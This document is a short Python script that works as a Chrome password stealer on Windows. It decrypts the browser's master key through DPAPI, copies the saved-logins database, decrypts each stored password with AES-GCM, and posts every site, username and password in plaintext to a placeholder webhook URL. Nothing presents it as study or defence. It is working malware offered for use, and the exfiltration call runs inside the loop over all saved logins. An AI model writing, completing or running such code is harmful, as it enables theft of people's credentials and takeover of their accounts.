from json import loads
import os
import base64
import win32crypt
import shutil
import sqlite3
from Cryptodome.Cipher import AES
import requests

webhook_url = "WEBHOOK_URL"

path = os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data\\"

local_state = open(path + "Local State", "r").read()
local_state = loads(local_state)

encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

login_data = path + "Default\\Login Data"
shutil.copy2(login_data, "login.db")

conn = sqlite3.connect("login.db")
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

for row in cursor.fetchall():
    website = row[0]
    email = row[1]
    encrypted_password = row[2]
    iv = encrypted_password[3:15]
    aes = AES.new(decrypted_key, AES.MODE_GCM, iv)
    main_encrypted = encrypted_password[15:]
    decrypted_password = aes.decrypt(main_encrypted)

    data = {
        "website": website,
        "email": email,
        "password": decrypted_password[:-16].decode('utf-8')  # Remove the padding and decode
    }

    response = requests.post(webhook_url, json=data)
    
    
conn.close()
